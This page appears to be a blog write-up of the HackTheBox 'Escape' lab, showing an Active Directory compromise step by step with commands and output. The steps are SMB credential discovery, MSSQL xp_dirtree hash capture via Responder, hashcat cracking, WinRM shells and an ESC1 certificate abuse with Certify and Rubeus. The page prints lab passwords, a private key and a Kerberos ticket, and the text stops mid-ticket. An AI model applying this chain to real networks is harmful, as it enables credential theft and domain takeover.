+++
date = '2025-02-13T11:21:41-05:00'
draft = false
title = 'HtB Escape'
tags = ['writeup','hackthebox','medium','windows','active directory']
hideToc = false
+++
![HtB-Escape](/images/Escape.png)

Escape is a Medium difficulty Windows Active Directory machine that starts with an SMB share that guest authenticated users can download a sensitive PDF file. Inside the PDF file temporary credentials are available for accessing an MSSQL service running on the machine. An attacker is able to force the MSSQL service to authenticate to his machine and capture the hash. It turns out that the service is running under a user account and the hash is crackable. Having a valid set of credentials an attacker is able to get command execution on the machine using WinRM. Enumerating the machine, a log file reveals the credentials for the user `ryan.cooper`. Further enumeration of the machine, reveals that a Certificate Authority is present and one certificate template is vulnerable to the ESC1 attack, meaning that users who are legible to use this template can request certificates for any other user on the domain including Domain Administrators. Thus, by exploiting the ESC1 vulnerability, an attacker is able to obtain a valid certificate for the Administrator account and then use it to get the hash of the administrator user.

<!--more-->
---

## Scanning

### nmap

```sh
┌──(pl4stic㉿kali)-[~/htb/escape]
└─$ nmap -T4 -p- -A -v 10.129.228.253             
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-12 14:09 EST
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-13 03:11:50Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Issuer: commonName=sequel-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-18T23:03:57
| Not valid after:  2074-01-05T23:03:57
| MD5:   ee4c:c647:ebb2:c23e:f472:1d70:2880:9d82
|_SHA-1: d88d:12ae:8a50:fcf1:2242:909e:3dd7:5cff:92d1:a480
|_ssl-date: 2025-02-13T03:13:23+00:00; +8h00m00s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-02-13T03:13:23+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Issuer: commonName=sequel-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-18T23:03:57
| Not valid after:  2074-01-05T23:03:57
| MD5:   ee4c:c647:ebb2:c23e:f472:1d70:2880:9d82
|_SHA-1: d88d:12ae:8a50:fcf1:2242:909e:3dd7:5cff:92d1:a480
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2025-02-13T03:13:23+00:00; +8h00m00s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.228.253:1433: 
|     Target_Name: sequel
|     NetBIOS_Domain_Name: sequel
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-02-13T03:09:00
| Not valid after:  2055-02-13T03:09:00
| MD5:   68da:ef27:ea41:6d12:2269:237a:d664:9a05
|_SHA-1: 4048:3619:c26d:5707:301b:6187:9b05:e509:e508:6db9
| ms-sql-info: 
|   10.129.228.253:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Issuer: commonName=sequel-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-18T23:03:57
| Not valid after:  2074-01-05T23:03:57
| MD5:   ee4c:c647:ebb2:c23e:f472:1d70:2880:9d82
|_SHA-1: d88d:12ae:8a50:fcf1:2242:909e:3dd7:5cff:92d1:a480
|_ssl-date: 2025-02-13T03:13:23+00:00; +8h00m00s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-02-13T03:13:23+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Issuer: commonName=sequel-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-18T23:03:57
| Not valid after:  2074-01-05T23:03:57
| MD5:   ee4c:c647:ebb2:c23e:f472:1d70:2880:9d82
|_SHA-1: d88d:12ae:8a50:fcf1:2242:909e:3dd7:5cff:92d1:a480
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC
49718/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

### SMB - 445/tcp

Let's check to see what SMB shares might be available with guest access.

```sh
┌──(pl4stic㉿kali)-[~/htb/escape]
└─$ smbclient -L \\\\10.129.228.253\\                                   
Password for [WORKGROUP\pl4stic]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Public          Disk      
        SYSVOL          Disk      Logon server share
```

Looks like one non-standard SMB share: `Public`. Time to take a look what's inside.

```sh
┌──(pl4stic㉿kali)-[~/htb/escape]
└─$ smbclient \\\\10.129.228.253\\Public 
Password for [WORKGROUP\pl4stic]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Nov 19 06:51:25 2022
  ..                                  D        0  Sat Nov 19 06:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 08:39:43 2022

                5184255 blocks of size 4096. 1446539 blocks available
smb: \> get "SQL Server Procedures.pdf"
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (308.2 KiloBytes/sec) (average 308.2 KiloBytes/sec)
```

Not a whole lot, just one file. Taking a look at `SQL Server Procedures.pdf`, it appears we've got a credential to work with.

![escape1](/images/escape1.png)
`PublicUser:GuestUserCantWrite1`

## Initial Access

### MSSQL Access

![escape2](/images/escape2.png)
Our new credentials work for MSSQL, so let's see what we can find.

```sh
┌──(pl4stic㉿kali)-[~/htb/escape]
└─$ impacket-mssqlclient PublicUser:GuestUserCantWrite1@10.129.228.253
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (PublicUser  guest@master)>
```

Looks like we have permissions to execute `xp_dirtree`, which could provide us a nice vector to capture a NTLMv2 hash.  First we need to run `responder -I tun0` in another terminal, then run the following command.

```sh
SQL (PublicUser  guest@master)> xp_dirtree \\10.10.14.42\test
subdirectory   depth   file   
------------   -----   ----
```

And back on our responder, we've captured a NTLMv2 hash:

```sh
[+] Listening for events...
[SMB] NTLMv2-SSP Client   : 10.129.228.253
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:c5969d994b674258:AE1497816E645CE27915C6CEC8C52F89:01010000000000000065EDDF597DDB010EBCA1D1172C4C560000000002000800540047004100370001001E00570049004E002D00340055004D0058004E0041005A0033004B004400560004003400570049004E002D00340055004D0058004E0041005A0033004B00440056002E0054004700410037002E004C004F00430041004C000300140054004700410037002E004C004F00430041004C000500140054004700410037002E004C004F00430041004C00070008000065EDDF597DDB01060004000200000008003000300000000000000000000000003000002A7ABF43228740FAF3D93E221F2AB830C9923905E27F729AF24888649831512B0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00340032000000000000000000
```

### Crack Hash

```sh
┌──(pl4stic㉿kali)-[~/htb/escape]
└─$ hashcat -m 5600 sql_svc-hash.txt /usr/share/wordlists/rockyou.txt

SQL_SVC::sequel:c5969d994b674258:ae1497816e645ce27915c6cec8c52f89:01010000000000000065eddf597ddb010ebca1d1172c4c560000000002000800540047004100370001001e00570049004e002d00340055004d0058004e0041005a0033004b004400560004003400570049004e002d00340055004d0058004e0041005a0033004b00440056002e0054004700410037002e004c004f00430041004c000300140054004700410037002e004c004f00430041004c000500140054004700410037002e004c004f00430041004c00070008000065eddf597ddb01060004000200000008003000300000000000000000000000003000002a7abf43228740faf3d93e221f2ab830c9923905e27f729af24888649831512b0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00340032000000000000000000:REGGIE1234ronnie
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: SQL_SVC::sequel:c5969d994b674258:ae1497816e645ce279...000000
Time.Started.....: Wed Feb 12 14:27:59 2025 (3 secs)
Time.Estimated...: Wed Feb 12 14:28:02 2025 (0 secs)
```

Now we've got a valid domain account: `sequel.htb\sql_svc:REGGIE1234ronnie`

### Bloodhound

Let's use these credentials to dump some of the domain information from LDAP, and see if we find anything helpful and/or interesting.

```sh
┌──(pl4stic㉿kali)-[~/htb/escape]
└─$ bloodhound-python -c all -d sequel.htb -u sql_svc -p 'REGGIE1234ronnie' -ns 10.129.228.253 --dns-tcp
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: sequel.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.sequel.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.sequel.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.sequel.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 10 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.sequel.htb
INFO: Done in 00M 05S
```

Now we've got a list of all the users on the domain.

![escape3](/images/escape3.png)

And it looks like we've got `CanPSRemote` access to the Domain Controller.

![escape4](/images/escape4.png)

### Shell as sql_svc

```sh
┌──(pl4stic㉿kali)-[~/htb/escape]
└─$ evil-winrm -i 10.129.228.253 -u sql_svc -p 'REGGIE1234ronnie'                          
                                        
Evil-WinRM shell v3.7
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\sql_svc\Documents>
```

As I enumerate files on the machine, I find an interesting log file here: `C:\SQLServer\Logs\ERRORLOG.BAK`

```txt
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
```

Maybe `Ryan.Cooper` accidentally typed his password in as the username?  Turns out, that's exactly what happened and we have a new set of valid credentials.

```sh
┌──(pl4stic㉿kali)-[~/htb/escape]
└─$ netexec smb 10.129.228.253 -u Ryan.Cooper -p 'NuclearMosquito3' -d sequel.htb           
SMB    10.129.228.253  445    DC      [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB    10.129.228.253  445    DC      [+] sequel.htb\Ryan.Cooper:NuclearMosquito3
```

## Shell as Ryan.Cooper

```sh
┌──(pl4stic㉿kali)-[~/htb/escape]
└─$ evil-winrm -i 10.129.228.253 -u ryan.cooper -p 'NuclearMosquito3'             
                                        
Evil-WinRM shell v3.7
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents>
```

### winPEAS.exe

Uploaded `winPEASany.exe` to the machine and executed it. Not a whole lot new to go on.

### Certify.exe

Uploaded `Certify.exe` to the machine and executed it, looking for any vulnerable certificate templates. Looks like we might have a thread to pull on.

```shell
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> .\Certify.exe find /vulnerable /domain:sequel.htb

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'

[*] Listing info about the Enterprise CA 'sequel-DC-CA'

    Enterprise CA Name            : sequel-DC-CA
    DNS Hostname                  : dc.sequel.htb
    FullName                      : dc.sequel.htb\sequel-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Cert Start Date               : 11/18/2022 12:58:46 PM
    Cert End Date                 : 11/18/2121 1:08:46 PM
    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
      Allow  ManageCA, ManageCertificates               sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
    Enrollment Agent Restrictions : None

[!] Vulnerable Certificates Templates :

    CA Name                               : dc.sequel.htb\sequel-DC-CA
    Template Name                         : UserAuthentication
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
      Object Control Permissions
        Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
        WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519


Certify completed in 00:00:10.4261326
```

## Privilege Escalation

### ESC1 Attack

Based on our results from `Certipy.exe`, we can see that this server is vulnerable to an [ESC1](https://www.nccgroup.com/us/research-blog/defending-your-directory-an-expert-guide-to-fortifying-active-directory-certificate-services-adcs-against-exploitation/) attack.

>Attackers exploit misconfigured certificate templates that grant excessive permissions. These templates allow low privilege users to request certificates that impersonate high-privileged accounts, such as domain administrators leading to privilege escalation because attackers can request certificates that allow them to authenticate with elevated privileges.

```sh
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> .\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Request a Certificates

[*] Current user context    : sequel\Ryan.Cooper
[*] No subject name specified, using current context as subject.

[*] Template                : UserAuthentication
[*] Subject                 : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] AltName                 : administrator

[*] Certificate Authority   : dc.sequel.htb\sequel-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 13

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA35IURerdyKnNkeFyaUqGlh4xtpL2zLONfWLstoVgQ3way4w0
sbrcjZTlN8Gy+/6WYey9oiAmjASuQ2P7e/Pf2AsrbfH8RSFzI4YS1MfXsUE+4XDT
893ErYEpaPaPP8tcO/DijSnCJ3u/ZTsZbsGyu2J1+3mXCPR5qeJ0alVF9nOJHyHY
gUHb+tGFhazmBhY5tyY3jZdV0ObFSOK8Pfv8hXsQ88juuAwa330FLhoaYENArrx4
4y9TC0zKdkZmKmsoj60d6Gfho4UNuc3NaF4rZYKywVpyegOP3v7vuJKn1eJpljmv
AV7NE+H5HWffsVOUzl6et3YXiGSs5Ny0g7Cv7QIDAQABAoIBAE+ope6Pk7xmvCdJ
U9GuSyv70CzESol/RF+zurIB7d29v3JdH31gHiuYLN/j9VkSShTUHHFC0Vk8Zbb/
TeDJcS1yNWQ0P3WGSJcUs2r7VaADplr/L5YJo4VKqy2KBFpvpAp7ds1jXplg3z47
g4FSJNPdbjpPBYCcUykz1dT5UzdPInvGhcFeBrM4le9qm8n7Zdi/pjxNnkFUqhGR
7CfIOfFKWtYTA/FXvYtlI+lsfafVwDqb4llHSebgSn4JonFrBHxAynfIsvCD98Va
Mx9HJba0yLeX9oPZAyHTpPeKItkWOe4BSaTsVOLBpzRyPJV6tD2XgAKc/kYbmDa9
7/c8G0UCgYEA/Y7aJy+BnLxPvJydSY3gMvbfz5hEM0MQDS4N+QUOeMqp/kYD4Ci5
NTwMkjCTOUKb0o42uL4tuQp1Ou+AWlrmRxSDG6ZkeUk7aYGC6Q58GJWJynbPBBkZ
BG4ApRqwJVinvesuKGe/EIuPm/MZ0tX2k2iwMKaZ5on7GW84S0Vxbr8CgYEA4blL
BQYm0TzIWk2p5J9WHgj/vOl/RDNRLER9t+aUXYzr+Z+S+iSAqIoYkLzzG0K84mMW
3rU9u3udsXb2oSOJEdvB1xnG3H5j5++FBjYCQBd6tMhDKTmpk9GoXV9k0v0t1SOd
eIVogZ2d/7yD6We+NSaf0gmR0Zo+ZlIWT2xQOFMCgYEA+wwNgu7ObdklOaH3OXR3
nv4/6tLf88FaizImM4CGK6K9XT0FaVPozISADd56Zh9FGNwl4hSqQKPSHmAzvUJy
7b2pch71LAEOChBpBUeKJu0oWIX5whz3YCNqEA60iMWWj7vjH65YxpDnx4iS8OVY
Fet5RzIs/s1vCGfOXPiMrxECgYASjrVIOHVAhorCQdhR33epCHxd/6Ri6wUlaowb
bm2MM2XDJAdlYVLiiFf0rlQeTaJRymu665OjskoIqQslvFIskbCiCpB62DlGfD6n
gBE3S7be3ggHf6IdcQMyigE0B3SZLVBo9C7fWSIAQHNn4QuWOxKwpfDDFrdCmkUT
Sohd2QKBgQCl4Tl44rg2meMMxfk66NePx348qv6rUtCPuL0S7f4sBh2tzW+bbooL
wpnaembTbbd1uRIgQTg09wse/LAthAUAbg0F3HpIYgKPTeEp1mhrppFWBJ1oQziN
xYwBYmhZDBJq0HGsii9OiwpTzh1bBAEabDO/7CCY1MWRT+xuXtMPhw==
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGEjCCBPqgAwIBAgITHgAAAA2ss43v9xnSgAAAAAAADTANBgkqhkiG9w0BAQsF
ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjUwMjEzMDQyNzI1WhcNMzUwMjEx
MDQyNzI1WjBTMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYG
c2VxdWVsMQ4wDAYDVQQDEwVVc2VyczEUMBIGA1UEAxMLUnlhbi5Db29wZXIwggEi
MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDfkhRF6t3Iqc2R4XJpSoaWHjG2
kvbMs419Yuy2hWBDfBrLjDSxutyNlOU3wbL7/pZh7L2iICaMBK5DY/t789/YCytt
8fxFIXMjhhLUx9exQT7hcNPz3cStgSlo9o8/y1w78OKNKcIne79lOxluwbK7YnX7
eZcI9Hmp4nRqVUX2c4kfIdiBQdv60YWFrOYGFjm3JjeNl1XQ5sVI4rw9+/yFexDz
yO64DBrffQUuGhpgQ0CuvHjjL1MLTMp2RmYqayiPrR3oZ+GjhQ25zc1oXitlgrLB
WnJ6A4/e/u+4kqfV4mmWOa8BXs0T4fkdZ9+xU5TOXp63dheIZKzk3LSDsK/tAgMB
AAGjggLsMIIC6DA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiHq/N2hdymVof9
lTWDv8NZg4nKNYF338oIhp7sKQIBZQIBBDApBgNVHSUEIjAgBggrBgEFBQcDAgYI
KwYBBQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcV
CgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkq
hkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYF
Kw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFORtk6K4+zC/gd+nyd+p3fcF50Ik
MCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1hZG1pbmlzdHJhdG9yMB8GA1Ud
IwQYMBaAFGKfMqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8EgbwwgbkwgbaggbOg
gbCGga1sZGFwOi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAsQ049UHVi
bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
bixEQz1zZXF1ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFz
ZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEE
gbAwga0wgaoGCCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMtQ0EsQ049
QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
bmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/
b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsF
AAOCAQEAdXMkBxIp0tPWrGpVh/8jb8oKERZRZKHMnovRIiRh1+rrVEcVYHKzxPDE
1ecnQC7PM/o1USO6Uggb5DM2ojlVSFhGjrh8CX6skJSkbkMm2UvCWp3VbJXPiVXw
W1bv/F9Y5FNxK2ETtxyCz24FPV8LiI3M+kZlHIunU7HTdQdl1fDncQdQvs9ec+NI
emH5srIBY0jIEe2P7tSMYRT3EwvUsohzthwEphia+fK68ltpKx/AlZGDwjlyAa6f
3y2qzTosQDtdDnb2Vr0dtNR4Ky/fWgKKQPpBr4KDiG0cqmC/huV9NU27XflxroEM
RZud9Ji9JH3w7jPuiTxsMBBJxE6ncw==
-----END CERTIFICATE-----

[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

Certify completed in 00:00:13.4902574
```

We can copy the entire block (`RSA PRIVATE KEY` + `CERTIFICATE`) into a file back on our Kali machine: `cert.pem`, then run the following command to generate the `.pfx` certificate.

```sh
┌──(pl4stic㉿kali)-[~/htb/escape]
└─$ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

Now let's transfer that certificate back to the victim machine, and use it to request a Kerberos ticket for `administrator`. By appending `/getcredentials` to the command, it will provide us the NTLM hash for the `Administrator` account.

```sh
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> .\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials /show /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\administrator'
[*] Using domain controller: fe80::9916:5866:792d:73db%4:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIGSDCCBkSgAwIBBaEDAgEWooIFXjCCBVphggVWMIIFUqADAgEFoQwbClNFUVVFTC5IVEKiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCnNlcXVlbC5odGKjggUaMIIFFqADAgESoQMCAQKiggUIBIIFBNw3/ltLdLHc95cKRR9+MdwShMWAcxn5uwQFrWzWjb+y9F4c8hgCy+V7dYhi8vLeqFd15zWs6CjeTaA+pOPTJmWAMNci/xoPEDmT8Nnb4gho6PbrF7UYWhYHTz41GsF5svxVlQrhtS/oefLVWh/6U9IAeU4Us+83D+r4dBbjDHN97uhJS5cSBOkRvyLkkYmh8d9FoQoq47quoPd372Jl1w8UtZkQXoWCUF6AU7pSaHcIoRBXyoyZqTqW3yBoUXxtMLptLMwjRWVDtcO7R6vUZ7ofW38QUwhLcEMEPBM3rXqpL6bQuOlQ5apftdDw2/WR3OYJkEaFhXq+Ihjbzw3nFWHYf+0yBi2hqi3CrAfWc7NRebI1GpmCVEOGap8Q58hicHak+pO5GN+VRxNqQ36aNmq3++ABnyrk/lPOxTTLF6hmAjSEOONG9q2KSnvgDp3EC8boOMlMmAdIkbE6U3LHXow0B2v2Lqmn9fiDZ+Oh9WxzRyTL5KL90CvX5+DObBv55dYiixAcIwhhnW6iXqmIhne4oD/AwpWDsGmAq++x4nvzBsJq92hgvIQpzK98I1e1px4XrtqWvmCiOm4OmysAsP2unIUymy08LiYCl6JQIMRSUN1CSiKaq0v/qirm9LnoEYqj3n95Xem1hJkcWwRx/f5h5QsHAoAumPj3QGG76cZ1ZvojShyclZ5eQVQwDcfXv4Jhr1IZ5r+fNX+B9o8hT5VIaO8wwQp0vdsuaIwZoSlxbwsvtDLNgUAnWoBa3JrCRm2Q5DgtYLrPzoFVqSSZqf+0qN1BVpgeigU9CwH1yZNBP6s6jKxOHHRaGRuyaCHbgtxBgJGk754ic0zFsWMt2vM8ohb/g08kFIsTQHIh7JkPEVYy0pvlPuURzaYPKpbPJWdQrkfB82iKf4FUN3bWLU4YUmh7EdyCEXWBhPwxu3UFDIm4Q4UNbWzpxe8Ig7fqgo9Jd+a/Bjz/1xwQ7gFayP00uUa8fAflHEgM9WJNAIVCe